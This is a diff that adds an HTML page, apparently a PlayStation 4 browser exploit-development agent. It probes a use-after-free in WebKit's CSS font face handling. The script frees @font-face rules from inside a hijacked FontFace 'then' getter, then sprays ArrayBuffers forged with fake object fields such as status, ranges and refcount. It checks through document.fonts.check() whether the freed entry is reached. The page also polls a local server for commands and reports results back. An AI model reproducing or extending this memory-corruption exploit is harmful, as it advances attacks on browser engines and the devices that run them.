@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>agent_v24 - Fake Reachability via check() status flip</title></head>
+<body>
+<h2>PS4 Agent v24 - UAF fake reachability probe (616)</h2>
+<div id="ver">v24 (reachability)</div>
+<div id="status">Connecting...</div>
+<div id="log"></div>
+<script>
+var SERVER = 'http://192.168.100.2:8080';
+var el = document.getElementById('log');
+var statusEl = document.getElementById('status');
+function log(m) {
+    var d = document.createElement('div');
+    d.textContent = '[' + new Date().toLocaleTimeString() + '] ' + m;
+    el.appendChild(d);
+    window.scrollTo(0, document.body.scrollHeight);
+}
+function sendResult(tag, data) {
+    try {
+        var x = new XMLHttpRequest();
+        x.open('GET', SERVER + '/result?tag=' + encodeURIComponent(tag) + '&r=' + encodeURIComponent(String(data)), false);
+        x.send();
+        log('SENT [' + tag + ']: ' + String(data).substring(0, 300));
+    } catch(e) { log('SEND ERROR: ' + e); }
+}
+function sendLog(m) {
+    try {
+        var x = new XMLHttpRequest();
+        x.open('GET', SERVER + '/log?m=' + encodeURIComponent(m), false);
+        x.send();
+    } catch(e) {}
+}
+function poll() {
+    try {
+        var x = new XMLHttpRequest();
+        x.open('GET', SERVER + '/poll', false);
+        x.send();
+        var resp = x.responseText;
+        if (resp && resp !== 'null') { return JSON.parse(resp); }
+    } catch(e) {}
+    return null;
+}
+
+var O_FAMILIES  = 0x20;
+var O_RANGESBUF = 0x28;
+var O_RANGESCAP = 0x30;
+var O_RANGESSZ  = 0x34;
+var O_STATUS    = 0xa8;
+
+var commands = {
+    'info': function() {
+        return JSON.stringify({ ua: navigator.userAgent, check: (document.fonts ? typeof document.fonts.check : 'nofonts') });
+    },
+
+    // =====================================================================
+    // REACHABILITY PROBE
+    // Question: is the stale m_facesLookupTable entry (freed B) actually
+    // consulted by document.fonts.check() on 616?
+    // Signal: after free+spray with fake m_status=Pending(0) and empty
+    // ranges (size=0 -> rangesMatchCodePoint always true, CSSFontFace.cpp:418),
+    // check('1em b', X) returns :
+    //    FALSE if fake is reached (matching face Pending/Loading, 616/7616 check())
+    //    TRUE  if fake is NOT reached (empty family -> no matching faces -> true)
+    // Control family 'zz-nosuch' must stay TRUE throughout.
+    // Wedge-avoidance: the load() that triggers the then-getter must see the
+    // fake as Status::Failure (line 196 reject path) so wrapper() never runs;
+    // we only rewrite the buffers to Pending AFTER the load promise settles.
+    // =====================================================================
+    'reach_probe': function() {
+        return new Promise(function(resolve) {
+            var out = [];
+            function push(m) { out.push(m); sendLog('RCH: ' + m); }
+            var done = false;
+            function finish() { if (!done) { done = true; clearTimeout(timer); resolve(out.join('\n')); } }
+            var timer = setTimeout(finish, 60000);
+
+            (async function() {
+                try {
+                    var spray_count = 0x80;
+                    var spray_font_rule = '';
+                    var uaf_font_rule   = '@font-face{font-family:b;src:url(nonexistent-font.woff);unicode-range:U+0042;}';
+                    var abs = [];
+                    var A = new FontFace('a', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+                    document.fonts.add(A);
+                    void A.loaded;
+                    var style = document.createElement('style');
+                    document.head.appendChild(style);
+                    var uaf_idx = style.sheet.cssRules.length;
+                    style.sheet.insertRule(uaf_font_rule, style.sheet.cssRules.length);
+                    try { document.body.offsetTop; } catch(e) {}
+                    push('rules set: uaf_idx=' + uaf_idx + ' cssRules=' + style.sheet.cssRules.length);
+
+                    function tryCheck(fam, ch) {
+                        var res;
+                        try { res = document.fonts.check(fam, ch); } catch(e) { res = 'ERR:' + (e && e.message || e); }
+                        return res;
+                    }
+
+                    // ---- PHASE 1: baseline before UAF ----
+                    push('-- P1 baseline (rule b present, real face loading) --');
+                    push('check(1em b,B)=' + tryCheck('1em b','B'));
+                    push('check(1em b,A)=' + tryCheck('1em b','A'));
+                    push('check(1em zz,A)=' + tryCheck('1em zz','A'));
+
+                    // ---- install then-getter: free B + spray with status=Failure ----
+                    var old_then = FontFace.prototype.then;
+                    Object.defineProperty(FontFace.prototype, 'then', {
+                        configurable: true,
+                        get: function() {
+                            if (this === A) {
+                                push('THEN on A: freeing B + spraying (status=Failure)');
+                                // delete all rules EXCEPT uaf_idx by snapshot & descending order
+                                var idxs = [];
+                                for (var i = 0; i < style.sheet.cssRules.length; i++) idxs.push(i);
+                                for (var d = idxs.length - 1; d >= 0; d--) {
+                                    if (idxs[d] !== uaf_idx) { try { style.sheet.deleteRule(idxs[d]); } catch(e) {} }
+                                }
+                                try { document.body.offsetTop; } catch(e) {}
+                                try { style.sheet.deleteRule(uaf_idx); } catch(e) {}
+                                try { document.body.offsetTop; } catch(e) {}
+                                for (var n = 0; n < spray_count; n++) {
+                                    var ab = new ArrayBuffer(0x100);
+                                    var dv = new DataView(ab);
+                                    dv.setBigUint64(O_FAMILIES, 0n, true);
+                                    dv.setBigUint64(O_RANGESBUF, 0n, true);
+                                    dv.setUint32(O_RANGESCAP, 0, true);
+                                    dv.setUint32(O_RANGESSZ, 0, true);   // empty -> matches any
+                                    dv.setUint8(O_STATUS, 4, true);      // Failure (for the triggering load)
+                                    dv.setBigUint64(8, 1n, true);        // refcount
+                                    abs.push(ab);
+                                }
+                                push('  sprayed ' + abs.length + ' AB(0x100)');
+                            }
+                            return undefined;
+                        }
+                    });
+
+                    // ---- PHASE 2: trigger load(); fake status=Failure -> REJECT before wrapper() ----
+                    var loadSettled = false;
+                    var p;
+                    try {
+                        p = document.fonts.load('1em a, b', 'AB');
+                    } catch(e) {
+                        push('load THREW: ' + e);
+                        loadSettled = true;
+                        p = null;
+                    }
+                    if (p) {
+                        p.then(
+                            function(v) { push('load RESOLVED (unexpected!)'); loadSettled = true; },
+                            function(re) { push('load REJECTED (expected via Failure): ' + re); loadSettled = true; }
+                        );
+                    }
+                    // wait up to 8s for the load to settle
+                    for (var w1 = 0; w1 < 8 && !loadSettled; w1++) {
+                        await new Promise(function(r){ setTimeout(r, 1000); });
+                    }
+                    push('loadSettled=' + loadSettled);
+                    try { Object.defineProperty(FontFace.prototype, 'then', { configurable: true, value: old_then }); } catch(e) {}
+
+                    // ---- PHASE 3: rewrite ALL ABs -> rnges empty, status=Pending(0) ----
+                    push('-- P3 rewrite all ABs to status=Pending(0), empty ranges --');
+                    for (var k = 0; k < abs.length; k++) {
+                        try {
+                            var dvk = new DataView(abs[k]);
+                            dvk.setUint8(O_STATUS, 0, true);            // Pending
+                            dvk.setBigUint64(O_RANGESBUF, 0n, true);
+                            dvk.setUint32(O_RANGESCAP, 0, true);
+                            dvk.setUint32(O_RANGESSZ, 0, true);         // empty
+                        } catch(e) {}
+                    }
+                    push('rewrote ' + abs.length + ' ABs');
+
+                    // ---- PHASE 4: the decisive check() probes ----
+                    push('-- P4 check() probes (expect FALSE if fake reached, TRUE if not) --');
+                    var probes = ['A', 'B', 'C', '\u0100', 'z'];
+                    for (var pi = 0; pi < probes.length; pi++) {
+                        var ch = probes[pi];
+                        push('check(1em b,' + ch + ')=' + tryCheck('1em b', ch));
+                    }
+                    push('control check(1em zz,' + 'A' + ')=' + tryCheck('1em zz', 'A'));
+                    push('control check(1em zz,' + 'C' + ')=' + tryCheck('1em zz', 'C'));
+                    push('control check(1em serif,' + 'A' + ')=' + tryCheck('1em serif', 'A'));
+
+                    // ---- PHASE 5: scan ABs for any WebKit write (identify the fake chunk) ----
+                    var bump = [];
+                    for (var zi = 0; zi < abs.length; zi++) {
+                        try {
+                            var dvz = new DataView(abs[zi]);
+                            var f = dvz.getBigUint64(O_FAMILIES, true);
+                            var rb = dvz.getBigUint64(O_RANGESBUF, true);
+                            var ss = dvz.getUint32(O_RANGESSZ, true);
+                            var st = dvz.getUint8(O_STATUS, true);
+                            var rf = dvz.getBigUint64(8, true);
+                            if (f !== 0n || rb !== 0n || ss !== 0 || st !== 0 || rf !== 1n) {
+                                bump.push('ab[' + zi + '] fam=' + f.toString(16) + ' rbuf=' + rb.toString(16) + ' rsz=' + ss + ' st=' + st + ' ref=' + rf.toString(16));
+                            }
+                        } catch(e) {}
+                    }
+                    push('changed-after-probes buffers: ' + bump.length);
+                    for (var bi = 0; bi < bump.length && bi < 20; bi++) push('  ' + bump[bi]);
+                    push('document.fonts.size=' + document.fonts.size);
+
+                    push('== REACHABILITY PROBE DONE ==');
+                } catch(e) {
+                    push('FATAL: ' + e + (e && e.stack ? ' | ' + e.stack : ''));
+                } finally {
+                    clearTimeout(timer);
+                    finish();
+                }
+            })();
+        });
+    }
+};
+
+log('PS4 Agent v24 started');
+function mainLoop() {
+    try {
+        var cmd = poll();
+        if (cmd && cmd.action) {
+            log('CMD: ' + cmd.action + (cmd.args ? ' ' + JSON.stringify(cmd.args) : ''));
+            if (commands[cmd.action]) {
+                try {
+                    var result = commands[cmd.action].apply(null, cmd.args || []);
+                    if (result && typeof result.then === 'function') {
+                        result.then(function(val) { sendResult(cmd.action, val); })
+                              .catch(function(e) { sendResult(cmd.action, 'PROMISE REJECT: ' + (e && e.stack || e)); });
+                    } else {
+                        sendResult(cmd.action, result);
+                    }
+                } catch(e) { sendResult(cmd.action, 'THROW: ' + (e && e.stack || e)); }
+            } else {
+                sendResult(cmd.action, 'UNKNOWN: ' + cmd.action);
+            }
+        }
+    } catch(e) { log('LOOP ERROR: ' + e); }
+    statusEl.textContent = 'Active | ' + new Date().toLocaleTimeString();
+    setTimeout(mainLoop, 500);
+}
+mainLoop();
+
+// ===== AUTO-RUN =====
+function autoStart() {
+    log('AUTO: reach_probe');
+    try {
+        var result = commands['reach_probe']();
+        if (result && typeof result.then === 'function') {
+            result.then(function(val) { sendResult('reach_probe', val); })
+                  .catch(function(e) { sendResult('reach_probe', 'ERR: ' + (e && e.stack || e)); });
+        } else { sendResult('reach_probe', result); }
+    } catch(e) { sendResult('reach_probe', 'THROW: ' + (e && e.stack || e)); }
+}
+setTimeout(function() {
+    try { document.fonts.ready.then(function(){ setTimeout(autoStart, 300); }); }
+    catch(e) { autoStart(); }
+}, 1000);
+
+var TOKEN = Math.random().toString(36).slice(2, 10);
+sendLog('PAGE:new:v24:' + TOKEN);
+try {
+    var hb = new Worker(URL.createObjectURL(new Blob([
+        'var t="' + TOKEN + '";setInterval(function(){var x=new XMLHttpRequest();x.open("GET","' + SERVER + '/log?m=BEAT:"+t,false);x.send();},2000);'
+    ], { type: 'application/javascript' })));
+} catch(e) { log('hb fail: ' + e); }
+</script>
+</body></html>
